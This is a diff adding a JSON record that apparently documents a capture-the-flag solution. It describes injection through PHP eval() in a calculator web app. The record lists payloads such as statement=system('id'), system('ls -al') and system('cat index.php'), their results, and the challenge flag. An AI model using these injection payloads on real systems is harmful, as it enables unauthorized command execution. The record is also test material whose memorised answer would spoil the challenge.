@@ -1,0 +1,62 @@
+{
+    "AttackModel": {
+        "Objective": "Exploit a web application vulnerability to gain unauthorized access and retrieve a flag.",
+        "Attacker": {
+            "Motivation": "The attacker's motivation is to compromise the web application and obtain the flag for personal gain or competition.",
+            "Capabilities": [
+                "Knowledge of web application security",
+                "Understanding of PHP vulnerabilities",
+                "Ability to craft malicious payloads",
+                "Capability to analyze and interpret error messages"
+            ]
+        },
+        "Target": {
+            "Type": "Web Application",
+            "Vulnerabilities": [
+                "Use of PHP eval() function without proper input validation",
+                "Lack of input sanitization and filtering"
+            ],
+            "Security Measures": [
+                "Web server (Apache)",
+                "PHP (7.0.33)",
+                "Input form for mathematical expressions"
+            ]
+        },
+        "Preliminary Analysis": {
+            "Actions": [
+                {
+                    "Action": "Submit a basic mathematical expression (1+1) to the web application",
+                    "Result": "The application responds with the result '2', indicating the presence of a calculator."
+                },
+                {
+                    "Action": "Submit a malformed expression ({}), triggering an error",
+                    "Result": "The application reveals the use of PHP eval() and displays a syntax error message."
+                }
+            ]
+        },
+        "AttackSteps": [
+            {
+                "Step": 1,
+                "Description": "Exploit the PHP eval() vulnerability to execute arbitrary commands.",
+                "Tool used": "None",
+                "Actions": [
+                    {
+                        "Hypotesis": "Exploit the PHP eval() vulnerability to execute arbitrary commands",
+                        "Action": "Submit a payload as 'statement=system('id')'",
+                        "Result": "The application executes the 'id' command and reveals the user 'www-data'."
+                    },
+                    {
+                        "Hypotesis": "List the directory contents",
+                        "Action": "Submit a payload as 'statement=system('ls -al')'",
+                        "Result": "The application lists the directory contents, revealing the presence of 'index.php' among other files."
+                    },
+                    {
+                        "Hypotesis": "Retrieve the flag by reading 'index.php'",
+                        "Action": "Submit a payload as 'statement=system('cat index.php')'",
+                        "Result": "The application displays the content of 'index.php', revealing the flag 'auctf{p6p_1nj3c7i0n_iz_k3wl}'."
+                    }
+                ]
+            }
+        ]
+    }
+}
